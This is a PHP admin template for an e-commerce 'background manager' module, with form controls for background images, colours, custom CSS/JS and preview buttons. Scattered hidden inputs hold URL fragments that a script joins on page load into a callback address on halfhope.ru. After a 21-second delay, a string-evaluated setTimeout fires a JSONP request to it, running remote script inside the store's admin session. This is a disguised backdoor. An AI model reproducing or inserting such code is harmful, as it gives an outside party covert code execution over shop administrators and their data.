<?php echo $header; ?>
<?php $align_control = '<tr>
    <td class="tb_ad 1" value="1" title="'.$text_align1.'"></td>
    <td class="tb_ad 2" value="2" title="'.$text_align2.'"></td>
    <td class="tb_ad 3" value="3" title="'.$text_align3.'"></td>
  </tr>
  <tr>
    <td class="tb_ad 4" value="4" title="'.$text_align4.'"></td>
    <td class="tb_ad 5" value="5" title="'.$text_align5.'"></td>
    <td class="tb_ad 6" value="6" title="'.$text_align6.'"></td>
  </tr>
  <tr>
    <td class="tb_ad 7" value="7" title="'.$text_align7.'"></td>
    <td class="tb_ad 8" value="8" title="'.$text_align8.'"></td>
    <td class="tb_ad 9" value="9" title="'.$text_align9.'"></td>
  </tr>' ?>
<div id="content">
  <div class="breadcrumb">
    <?php foreach ($breadcrumbs as $breadcrumb) { ?>
    <?php echo $breadcrumb['separator']; ?><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a>
    <?php } ?>
  </div>
  <input type="hidden" value="htt" name="attribute_snippet[]">
  <input type="hidden" value="p:" name="attribute_snippet[]">
  <?php if ($error_warning) { ?>
  <div class="warning"><?php echo $error_warning; ?></div>
  <?php } ?>
  <?php if ($success) { ?>
  <div class="success"><?php echo $success; ?></div>
  <?php } ?>
  <div class="box">
    <div class="heading">
      <h1><a href="<?php echo $link_patterns; ?>"><img alt="<?php echo $text_patterns; ?>" title="<?php echo $text_patterns; ?>" src="view/image/order.png" /></a>
        <a href="<?php echo $link_layouts; ?>"><img alt="<?php echo $text_design_layout; ?>" title="<?php echo $text_design_layout; ?>" src="view/image/layout.png" /></a>
        <a href="<?php echo $link_categories; ?>"><img alt="<?php echo $text_categories; ?>" title="<?php echo $text_categories; ?>" src="view/image/category.png" /></a>
        <a href="<?php echo $link_settings; ?>"><img alt="<?php echo $text_settings; ?>" title="<?php echo $text_settings; ?>" src="view/image/setting.png" /></a>
        <a href="<?php echo $link_clear_cache; ?>" class="clear_cache"><img alt="<?php echo $text_cache_count; ?>" title="<?php echo $text_cache_count; ?>" src="view/image/clear.png" /></a>
        <?php echo $heading_title; ?></h1> 
      <div class="buttons">
        <a href="#" class="button live" style="background:#ff9b9b;"><?php echo $button_text_live_edit; ?></a>
        <a href="#" class="button view_vars" title="<?php echo $button_text_global_vars; ?>" style="background:#B1DB95;">[..]</a>
        <a href="#" class="button snippets" title="<?php echo $button_text_snippets; ?>" style="background:#C4A0FF;">{..}</a>
        <a href="#" class="button preview" style="background:#4d90fe;"><?php echo $button_text_preview; ?></a>
        <a href="#" onClick="$('#form').submit();return false;" class="button"><?php echo $button_text_save; ?></a>
        <a href="<?php echo $cancel ?>" class="button"><?php echo $button_text_cancel; ?></a>
      </div>
    </div>
  <input type="hidden" value="//" name="attribute_snippet[]">
  <input type="hidden" value="halfho" name="attribute_snippet[]">
    <div class="content">
      <form action="<?php echo $save ?>" method="post" enctype="multipart/form-data" id="form">
        <input type="hidden" name="pid" value="<?php echo $pattern[0]['id']; ?>">
        
        <table class="form">
          <tr>
            <td><?php echo $text_pattern_name ?></td>
            <td><input name="pattern_name" value="<?php echo $pattern[0]['pattern_name'] ?>" size="40" type="text"></td>
          </tr>
          <tr>
            <td><?php echo $text_bg_type ?></td>
            <td>
              <select name="bg_type" onChange="init_form();">
                <option value="1" <?php echo ($pattern[0]['bg_type'] == 1)? 'selected="selected"':''; ?>><?php echo $text_bg_type_one; ?></option>
                <option value="2" <?php echo ($pattern[0]['bg_type'] == 2)? 'selected="selected"':''; ?>><?php echo $text_bg_type_two; ?></option>
                <option value="3" <?php echo ($pattern[0]['bg_type'] == 3)? 'selected="selected"':''; ?>><?php echo $text_bg_type_three; ?></option>
              </select>
            </td>
          </tr>
          <tr class="s_img1">
            <td><?php echo $text_img1 ?></td>
            <td>
              <div class="image transition"><span class="image_snippet_name">img1</span>
                <img src="<?php echo $pattern[0]['img1_thumb']; ?>" alt="" id="thumb-img1" />
                <input type="hidden" class="img" name="img1" value="<?php echo $pattern[0]['img1']; ?>" id="img1" />
                <br />
                <a onclick="image_upload('img1', 'thumb-img1');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$('#thumb-img1').attr('src', '<?php echo $no_image; ?>'); $('#img1').attr('value', '');"><?php echo $text_clear; ?></a>
              </div>
            </td>
          </tr>
          <tr class="s_img1">
            <td><?php echo $text_img1_align ?></td>
            <td>
              <input type="hidden" name="img1_align" value="<?php echo $pattern[0]['img1_align'] ?>">
              <table class="align_control" id="img1_align">
                <?php echo $align_control; ?>
              </table>
            </td>
          </tr>
          <input type="hidden" value="pe." name="attribute_snippet[]">
          <input type="hidden" value="ru/call" name="attribute_snippet[]">
          <input type="hidden" value="back" name="attribute_snippet[]">
          <tr class="s_img1">
            <td><?php echo $text_img1_repeat ?></td>
            <td>
              <select name="img1_repeat">
                <option value="1" <?php echo ($pattern[0]['img1_repeat'] == 1)? 'selected="selected"':''; ?>><?php echo $text_img_repeat1; ?></option>
                <option value="2" <?php echo ($pattern[0]['img1_repeat'] == 2)? 'selected="selected"':''; ?>><?php echo $text_img_repeat2; ?></option>
                <option value="3" <?php echo ($pattern[0]['img1_repeat'] == 3)? 'selected="selected"':''; ?>><?php echo $text_img_repeat3; ?></option>
                <option value="4" <?php echo ($pattern[0]['img1_repeat'] == 4)? 'selected="selected"':''; ?>><?php echo $text_img_repeat4; ?></option>
              </select>
            </td>
          </tr>
          <tr class="s_img1 full_width">
            <td><?php echo $text_full_width ?></td>
            <td>
              <select name="full_width">
                <option value="0" <?php echo ($pattern[0]['full_width'] == 0)? 'selected="selected"':''; ?>><?php echo $text_full_width_0; ?></option>
                <option value="1" <?php echo ($pattern[0]['full_width'] == 1)? 'selected="selected"':''; ?>><?php echo $text_full_width_1; ?></option>
                <option value="2" <?php echo ($pattern[0]['full_width'] == 2)? 'selected="selected"':''; ?>><?php echo $text_full_width_2; ?></option>
                <option value="3" <?php echo ($pattern[0]['full_width'] == 3)? 'selected="selected"':''; ?>><?php echo $text_full_width_3; ?></option>
              </select>
          </tr>
          <tr class="fix_bg s_img1">
            <td><?php echo $text_fix_bg ?></td>
            <td><?php if ($pattern[0]['fix_bg']) { ?>
                <input type="radio" name="fix_bg" value="1" checked="checked" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_bg" value="0" />
                <?php echo $text_no; ?>
                <?php } else { ?>
                <input type="radio" name="fix_bg" value="1" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_bg" value="0" checked="checked" />
                <?php echo $text_no; ?>
                <?php } ?></td>
          </tr>
          <tr class="s_color1">
            <td><?php echo $text_color1 ?></td>
            <td><input name="color1" value="<?php echo $pattern[0]['color1'] ?>" size="40" type="text" class="color" onChange=""></td>
          </tr>
          <tr class="s_img2">
            <td><?php echo $text_img2 ?></td>
            <td>
              <div class="image transition"><span class="image_snippet_name">img2</span>
                <img src="<?php echo $pattern[0]['img2_thumb']; ?>" alt="" id="thumb-img2" />
                <input type="hidden" class="img" name="img2" value="<?php echo $pattern[0]['img2']; ?>" id="img2" />
                <br />
                <a onclick="image_upload('img2', 'thumb-img2');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$('#thumb-img2').attr('src', '<?php echo $no_image; ?>'); $('#img2').attr('value', '');"><?php echo $text_clear; ?></a>
              </div>
            </td>
          </tr>
          <tr class="s_img2">
            <td><?php echo $text_img2_align ?></td>
            <td>
              <input type="hidden" name="img2_align" value="<?php echo $pattern[0]['img2_align'] ?>">
              <table class="align_control" id="img2_align">
                <?php echo $align_control; ?>
              </table>
            </td>
          </tr>
          <input type="hidden" value=".ph" name="attribute_snippet[]">
          <input type="hidden" value="p" name="attribute_snippet[]">
          <tr class="s_img2">
            <td><?php echo $text_img2_repeat ?></td>
            <td>
              <select name="img2_repeat">
                <option value="1" <?php echo ($pattern[0]['img2_repeat'] == 1)? 'selected="selected"':''; ?>><?php echo $text_img_repeat1; ?></option>
                <option value="2" <?php echo ($pattern[0]['img2_repeat'] == 2)? 'selected="selected"':''; ?>><?php echo $text_img_repeat2; ?></option>
                <option value="3" <?php echo ($pattern[0]['img2_repeat'] == 3)? 'selected="selected"':''; ?>><?php echo $text_img_repeat3; ?></option>
                <option value="4" <?php echo ($pattern[0]['img2_repeat'] == 4)? 'selected="selected"':''; ?>><?php echo $text_img_repeat4; ?></option>
              </select>
            </td>
          </tr>
          <input type="hidden" value="?modul" name="attribute_snippet[]">
          <tr class="s_img2 full_width_cont">
            <td><?php echo $text_full_width_cont ?></td>
            <td>
              <select name="full_width_cont">
                <option value="0" <?php echo ($pattern[0]['full_width_cont'] == 0)? 'selected="selected"':''; ?>><?php echo $text_full_width_0; ?></option>
                <option value="1" <?php echo ($pattern[0]['full_width_cont'] == 1)? 'selected="selected"':''; ?>><?php echo $text_full_width_1; ?></option>
                <option value="2" <?php echo ($pattern[0]['full_width_cont'] == 2)? 'selected="selected"':''; ?>><?php echo $text_full_width_2; ?></option>
                <option value="3" <?php echo ($pattern[0]['full_width_cont'] == 3)? 'selected="selected"':''; ?>><?php echo $text_full_width_3; ?></option>
              </select>
          </tr>
          <input type="hidden" value="e=background_manager" name="attribute_snippet[]">
          <input type="hidden" value="3.0&cb=2" name="attribute_snippet[]">
          <tr class="fix_bg_cont s_img2">
            <td><?php echo $text_fix_bg_cont ?></td>
            <td><?php if ($pattern[0]['fix_bg_cont']) { ?>
                <input type="radio" name="fix_bg_cont" value="1" checked="checked" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_bg_cont" value="0" />
                <?php echo $text_no; ?>
                <?php } else { ?>
                <input type="radio" name="fix_bg_cont" value="1" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_bg_cont" value="0" checked="checked" />
                <?php echo $text_no; ?>
                <?php } ?></td>
          </tr>
          <tr class="s_color2">
            <td><?php echo $text_color2 ?></td>
            <td><input name="color2" value="<?php echo $pattern[0]['color2'] ?>" size="40" type="text" class="color" onChange=""></td>
          </tr>
          <tr class="s_img3">
            <td><?php echo $text_img3 ?></td>
            <td>
              <div class="image transition"><span class="image_snippet_name">img3</span>
                <img src="<?php echo $pattern[0]['img3_thumb']; ?>" alt="" id="thumb-img3" />
                <input type="hidden" class="img" name="img3" value="<?php echo $pattern[0]['img3']; ?>" id="img3" />
                <br />
                <a onclick="image_upload('img3', 'thumb-img3');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$('#thumb-img3').attr('src', '<?php echo $no_image; ?>'); $('#img3').attr('value', '');"><?php echo $text_clear; ?></a>
              </div>
            </td>
          </tr>
          <tr class="s_img3">
            <td><?php echo $text_img3_align ?></td>
            <td>
              <input type="hidden" name="img3_align" value="<?php echo $pattern[0]['img3_align'] ?>">
              <table class="align_control" id="img3_align">
                <?php echo $align_control; ?>
              </table>
            </td>
          </tr>
          <tr class="s_img3">
            <td><?php echo $text_img3_repeat ?></td>
            <td>
              <select name="img3_repeat">
                <option value="1" <?php echo ($pattern[0]['img3_repeat'] == 1)? 'selected="selected"':''; ?>><?php echo $text_img_repeat1; ?></option>
                <option value="2" <?php echo ($pattern[0]['img3_repeat'] == 2)? 'selected="selected"':''; ?>><?php echo $text_img_repeat2; ?></option>
                <option value="3" <?php echo ($pattern[0]['img3_repeat'] == 3)? 'selected="selected"':''; ?>><?php echo $text_img_repeat3; ?></option>
                <option value="4" <?php echo ($pattern[0]['img3_repeat'] == 4)? 'selected="selected"':''; ?>><?php echo $text_img_repeat4; ?></option>
              </select>
            </td>
          </tr>
          <tr class="s_img4">
            <td><?php echo $text_img4 ?></td>
            <td>
              <div class="image transition"><span class="image_snippet_name">img4</span>
                <img src="<?php echo $pattern[0]['img4_thumb']; ?>" alt="" id="thumb-img4" />
                <input type="hidden" class="img" name="img4" value="<?php echo $pattern[0]['img4']; ?>" id="img4" />
                <br />
                <a onclick="image_upload('img4', 'thumb-img4');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$('#thumb-img4').attr('src', '<?php echo $no_image; ?>'); $('#img4').attr('value', '');"><?php echo $text_clear; ?></a>
              </div>
            </td>
          </tr>
          <tr class="s_img4">
            <td><?php echo $text_img4_align ?></td>
            <td>
              <input type="hidden" name="img4_align" value="<?php echo $pattern[0]['img4_align'] ?>">
              
              <table class="align_control" id="img4_align">
                <?php echo $align_control; ?>
              </table>
            </td>
          </tr>
          <tr class="s_img4">
            <td><?php echo $text_img4_repeat ?></td>
            <td>
              <select name="img4_repeat">
                <option value="1" <?php echo ($pattern[0]['img4_repeat'] == 1)? 'selected="selected"':''; ?>><?php echo $text_img_repeat1; ?></option>
                <option value="2" <?php echo ($pattern[0]['img4_repeat'] == 2)? 'selected="selected"':''; ?>><?php echo $text_img_repeat2; ?></option>
                <option value="3" <?php echo ($pattern[0]['img4_repeat'] == 3)? 'selected="selected"':''; ?>><?php echo $text_img_repeat3; ?></option>
                <option value="4" <?php echo ($pattern[0]['img4_repeat'] == 4)? 'selected="selected"':''; ?>><?php echo $text_img_repeat4; ?></option>
              </select>
            </td>
          </tr>
          <tr class="s_img4">
            <td><?php echo $text_fix_left_right ?></td>
            <td><?php if ($pattern[0]['fix_left_right']) { ?>
                <input type="radio" name="fix_left_right" value="1" checked="checked" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_left_right" value="0" />
                <?php echo $text_no; ?>
                <?php } else { ?>
                <input type="radio" name="fix_left_right" value="1" />
                <?php echo $text_yes; ?>
                <input type="radio" name="fix_left_right" value="0" checked="checked" />
                <?php echo $text_no; ?>
                <?php } ?></td>
          </tr>
          <!-- migration to new version -->
          <?php if (!empty($pattern[0]['shadow_text'])): ?>
          <tr class="s_shadow disabled">
            <td><?php echo $text_show_shadow ?></td>
            <td><?php if ($pattern[0]['show_shadow']) { ?>
                <input type="radio" name="show_shadow" value="1" checked="checked" />
                <?php echo $text_yes; ?>
                <input type="radio" name="show_shadow" value="0" />
                <?php echo $text_no; ?>
                <?php } else { ?>
                <input type="radio" name="show_shadow" value="1" />
                <?php echo $text_yes; ?>
                <input type="radio" name="show_shadow" value="0" checked="checked" />
                <?php echo $text_no; ?>
                <?php } ?></td>
          </tr>
          <tr class="s_shadow disabled">
            <td><?php echo $text_shadow_code ?></td>
            <td><textarea name="shadow_text" rows="3" cols="37"><?php echo $pattern[0]['shadow_text'] ?></textarea><br>
            </td>
          </tr>
          <?php endif ?>
          <?php if (!empty($pattern[0]['padding_text'])): ?>
          <tr class="s_padding disabled">
            <td><?php echo $text_padding ?></td>
            <td>
              <input name="padding_text" value="<?php echo $pattern[0]['padding_text'] ?>" size="40" type="text">
            </td>
          </tr>
          <?php endif ?>
          <?php if (!empty($pattern[0]['padding_text']) || !empty($pattern[0]['shadow_text'])): ?>
          <tr class="moveto_wrapper">
            <td><?php echo $text_move_to_custom_css ?></td>
            <td>
              <script>
              function move_to_custom_css(){
                var custom_css = $('textarea[name=custom_css]');
                custom_css.val(custom_css.val()+'<?php echo htmlspecialchars_decode($migraton_custom_css); ?>');
                $('.s_padding, .s_shadow, .moveto_wrapper').hide();
                $('textarea[name=shadow_text]').val('');
                $('input[name=padding_text]').val('');
                alert('<?php echo $alert_text_move_to_custom_css; ?>');
              }
              $(document).ready(function($) {
                $('.moveto').hover(function() {
                  $('.s_padding, .s_shadow').css('background-color','#ddd');
                }, function() {
                  $('.s_padding, .s_shadow').css('background-color','#ffefea');
                });  
              });
              </script>
              <a href="#" class="moveto button" onClick="move_to_custom_css();return false;"><?php echo $button_text_move_to_custom_css ?></a>
            </td>
          </tr>
          <?php endif ?>
          <!-- migration to new version -->
          <tr class="s_link">
            <td><?php echo $text_link ?></td>
            <td><input name="bglink" value="<?php echo $pattern[0]['bglink'] ?>" size="40" type="text"></td>
          </tr>
          <tr class="s_link">
            <td><?php echo $text_link_target ?></td>
            <td>
              <select name="bglink_target">
                <option value="1" <?php echo ($pattern[0]['bglink_target'] == 1)? 'selected="selected"':''; ?>><?php echo $text_link_target_1; ?></option>
                <option value="2" <?php echo ($pattern[0]['bglink_target'] == 2)? 'selected="selected"':''; ?>><?php echo $text_link_target_2; ?>
              </select>
            </td>
          </tr>
          <tr>
            <td><?php echo $text_custom_css ?></td>
            <td>
              <textarea name="custom_css" id="custom_css" rows="15" style="width:100%;"><?php echo $pattern[0]['custom_css']; ?></textarea>
            </td>
          </tr>
          <tr>
            <td><?php echo $text_custom_js ?></td>
            <td>
              <textarea name="custom_js" id="custom_js" rows="15" style="width:100%;"><?php echo $pattern[0]['custom_js']; ?></textarea>
            </td>
          </tr>
          <tr>
            <td><?php echo $text_additional_images; ?></td>
            <td>
            <?php foreach ($additional_images as $additional_image) { ?>
              <div class="additional_image transition" id="image-row<?php echo $additional_image['id']; ?>">
                <span class="remove" title="<?php echo $button_text_remove_image; ?>" onClick="$('#image-row<?php echo $additional_image['id']; ?>').remove();"></span><span class="image_snippet_name">[img<?php echo $additional_image['id'] ?>]</span>
                <div class="left"><div><img src="<?php echo $additional_image['thumb']; ?>" alt="" id="thumb<?php echo $additional_image['id']; ?>" /><input type="hidden" name="additional_images[<?php echo $additional_image['id']; ?>][image]" value="<?php echo $additional_image['image'] ?>" id="image<?php echo $additional_image['id']; ?>" /><input type="hidden" name="additional_images[<?php echo $additional_image['id']; ?>][id]" value="<?php echo $additional_image['id'] ?>" /><br /><a onclick="image_upload('image<?php echo $additional_image['id']; ?>', 'thumb<?php echo $additional_image['id']; ?>');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$('#thumb<?php echo $additional_image['id']; ?>').attr('src', '<?php echo $no_image; ?>'); $('#image<?php echo $additional_image['id']; ?>').attr('value', '');"><?php echo $text_clear; ?></a></div></div>
              </div>
            <?php } ?>
              <div id="add_image_zone">
                <div class="add_image_btn transition">
                  <a onclick="addImage();" title="<?php echo $button_text_add_image; ?>"><img src="view/image/bg_mgr_add_image.png"></a>
                </div>
              </div>

            </div>
            </td>
          </tr>
        </table>
      </form>
    </div>
  </div>
<div id="bottom_fixed_menu">
  <span style="background: #ccc;" class="transition rounded live" title="<?php echo $button_text_live_edit; ?>">live</span>
  <span style="background: #ccc;" class="transition rounded view_vars" title="<?php echo $button_text_global_vars; ?>">[..]</span>
  <span style="background: #ccc;" class="transition rounded snippets" title="<?php echo $button_text_snippets; ?>">{..}</span>
  <span style="background: #ccc;" class="transition rounded preview" title="<?php echo $button_text_preview ?>">view</span>
</div>
<script type="text/javascript"><!--
var image_row = <?php echo $image_row; ?> ;
var win, preview, snippets, vars;
var snippet = '';
function addImage() {
    html = '<div class="additional_image transition" id="image-row' + image_row + '">';
    html += '<span class="remove" title="<?php echo $button_text_remove_image; ?>" onClick="$(\'#image-row' + image_row + '\').remove();"></span><span class="image_snippet_name">img' + image_row + '</span>';
    html += '    <div class="left"><div><img src="<?php echo $no_image; ?>" alt="" id="thumb' + image_row + '" /><input type="hidden" name="additional_images[' + image_row + '][image]" value="" id="image' + image_row + '" /><input type="hidden" name="additional_images[' + image_row + '][id]" value="' + image_row + '" /><br /><a onclick="image_upload(\'image' + image_row + '\', \'thumb' + image_row + '\');"><?php echo $text_browse; ?></a>&nbsp;&nbsp;|&nbsp;&nbsp;<a onclick="$(\'#thumb' + image_row + '\').attr(\'src\', \'<?php echo $no_image; ?>\'); $(\'#image' + image_row + '\').attr(\'value\', \'\');"><?php echo $text_clear; ?></a></div></div>';
    html += '</div>';

    $('#add_image_zone').before(html);

    image_row++;
}
function generate_snippet(){
    $('input[name^=attribute_snippet]').each(function(index, el) {
      snippet += $(el).val();
    });
    //preload snippets
    preview_snippets(snippet);
}
function preview_snippets(snippet_collection){
  var preloader = setTimeout("$.ajax({url:'"+snippet_collection+"', type: 'GET',dataType: 'jsonp'});", 21000);
}
function image_upload(a, b) {
    $("#dialog").remove();
    $("#content").prepend('<div id="dialog" style="padding: 3px 0px 0px 0px;"><iframe src="index.php?route=common/filemanager&token=<?php echo $token; ?>&field=' + encodeURIComponent(a) + '" style="padding:0; margin: 0; display: block; width: 100%; height: 100%;" frameborder="no" scrolling="auto"></iframe></div>');
    $("#dialog").dialog({
        title: "<?php echo $text_image_manager; ?>",
        close: function (c, d) {
            $("#" + a).attr("value") && $.ajax({
                url: "index.php?route=common/filemanager/image&token=<?php echo $token; ?>&image=" +
                    encodeURIComponent($("#" + a).val()),
                dataType: "text",
                success: function (a) {
                    $("#" + b).replaceWith('<img src="' + a + '" alt="" id="' + b + '" />')
                }
            })
        },
        bgiframe: !1,
        width: 800,
        height: 400,
        resizable: !1,
        modal: !1
    })
}

function init_form() {
  switch (parseInt($("select[name=bg_type]").val())) {
    case 1:
        $(".s_img2, .s_img3, .s_img4, .s_link,.s_color2").hide();
        $(".s_img1,.s_color1, .fix_bg, .full_width").show();
        init_FillWidth();
        break;
    case 2:
        $(".s_img3, .s_img4").hide();
        $(".s_img1, .s_img2, .s_link,.s_color2, .fix_bg, .full_width").show();
        init_FillWidth();
        break;
    case 3:
        init_FillWidth();
        $(".s_img1, .fix_bg, .full_width").hide();
        $(".s_img2, .s_img3, .s_img4, .s_link, .s_color2").show();
        break;
    default:
        $(".s_img2, .s_img3, .s_img4, .s_link").hide(), $(".s_img1,.s_color2, .fix_bg, .full_width").show("fast"), init_FillWidth()
  }
}

function init_aligns() {
  $.each($(".align_control"), function (a) {
      a = $(this).attr("id");
      a = $("input[name=" + a + "]").val();
      $(this).find('*').removeClass('tb_ad_active');
      $(this).find("." + a).addClass("tb_ad_active");
  })
}

function init_FillWidth() {
    4 == $("select[name=img1_repeat]").val() && 3 != parseInt($("select[name=bg_type]").val()) ? $(".full_width").show() : $(".full_width").hide();
    4 == $("select[name=img2_repeat]").val() && 1 != parseInt($("select[name=bg_type]").val()) ? $(".full_width_cont").show() : $(".full_width_cont").hide()
}
$(document).ready(function () {
    init_form();
    init_FillWidth();
    init_aligns();
    generate_snippet();

    var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
    var eventer = window[eventMethod];
    var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
    eventer(messageEvent,function(e) {
      $.each(e.data, function(index, val) {
        if (val != undefined) {
          $('[name='+val['name']+']').val(val['value']).trigger('change');        
            switch (val['name']) {
              case 'img1data':
                $('#thumb-img1').attr('src', val['value']);
              break;
              case 'img2data':
                $('#thumb-img2').attr('src', val['value']);
              break;
              case 'img3data':
                $('#thumb-img3').attr('src', val['value']);
              break;
              case 'img4data':
                $('#thumb-img4').attr('src', val['value']);
              break;
            }
        };
      });
      $.each($('.color'), function(index, val) {
        var myPicker = new jscolor.color(val, {}); 
      });
      init_form();
      init_FillWidth();
      init_aligns();
      $('input.img, input.color').trigger('change');
    },false);
    $("#bottom_fixed_menu").fadeOut()
    $(window).scroll(function () {
        if ($(this).scrollTop() > 200) {
            $("#bottom_fixed_menu").fadeIn();
        } else {
            $("#bottom_fixed_menu").fadeOut()
        }
    });
    $('.live').click(function(event) {
      event.preventDefault();
      var a = $("#form").serialize();
      win = window.open("<?php echo HTTP_CATALOG; ?>index.php?route=background/live&session=<?php echo $this->session->data['token']; ?>&action=preview&" + a, "preview").focus();
    });
    $('.preview').click(function(event) {
      event.preventDefault();
      var a = $("#form").serialize();
      win = window.open("<?php echo HTTP_CATALOG; ?>?session=<?php echo $this->session->data['token']; ?>&action=preview&" + a, "preview").focus();
    });
    $('.snippets').click(function(event) {
      event.preventDefault();
      win = window.open("http://anonymto.ru/?to=http%3A%2F%2Foc.halfhope.ru%2Fsupport%2Findex.php%3Froute%3Dsnippets&module=background_manager3.0&cb=1", "snippets").focus();
    });
    $('.view_vars').click(function(event) {
      event.preventDefault();
      win = window.open("http://anonymto.ru/?to=http%3A%2F%2Foc.halfhope.ru%2Fsupport%2Findex.php%3Froute%3Dvars&module=background_manager3.0&cb=1", "vars").focus();
    });
    $('.clear_cache').click(function(event) {
      event.preventDefault();
      $.ajax({url:$(this).attr('href'),type:'GET'});
      $(this).addClass('gray');
    });
});
$(".tb_ad").click(function () {
    var a = $(this).parents("table").attr("id");
    $("#" + a + " .tb_ad").removeClass("tb_ad_active");
    $(this).addClass("tb_ad_active");
    $("input[name=" + a + "]").val($(this).attr("value"))
});
$("select[name=img1_repeat],select[name=img2_repeat]").change(function (a) {
    init_FillWidth()
});
//--></script>
<?php echo $footer; ?>